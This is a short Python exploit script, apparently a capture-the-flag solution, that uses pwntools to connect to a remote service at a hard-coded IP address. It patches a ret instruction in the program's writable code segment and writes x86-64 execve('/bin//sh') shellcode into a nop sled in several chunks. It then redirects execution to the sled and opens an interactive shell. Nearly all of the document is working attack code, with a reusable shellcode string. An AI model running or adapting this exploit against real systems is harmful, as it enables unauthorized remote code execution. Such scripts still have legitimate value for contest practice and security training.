from pwn import *
s = remote('34.118.43.143' ,3010)
# text is writeable, so first, write nop instead of ret, then write shellcode on nopsled in main, then jump to nopsled and let the magic happen
shellcode = '\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
# we can write the shellcode only 8 bytes at a time, so we send it on three different payloads
s.recvuntil('BARS')
s.sendline('\xa3')
s.recvuntil('DROP?')
s.sendline('\x90\xe8\x57\xff\xff\xff\x00') # writing nop on ret without messing with the other opcodes
s.recvuntil('BARS')
s.sendline('\xd0')
s.recvuntil('DROP?')
s.sendline(shellcode[:7]) # first shellcode payload
log.info('first shellcode')
s.recvuntil('BARS')
s.sendline('\xd7')
s.recvuntil('DROP?')
s.sendline(shellcode[7:14]) # second shellcode payload
log.info('second shellcode')
s.recvuntil('BARS')
s.sendline('\xde')
s.recvuntil('DROP?')
s.sendline(shellcode[14:21]) # third shellcode payload
log.info('third shellcode')
s.recvuntil('BARS')
s.sendline('\xe5')
s.recvuntil('DROP?')
s.sendline(shellcode[21:]) # last shellcode payloaddd
log.info('fourth shellcode')
s.recvuntil('BARS')
s.sendline('\xa3')
s.recvuntil('DROP?')
s.sendline('\xe8\x22'.ljust(8,'\x00')) # jmp <main+199> which is on nopsled
s.interactive()
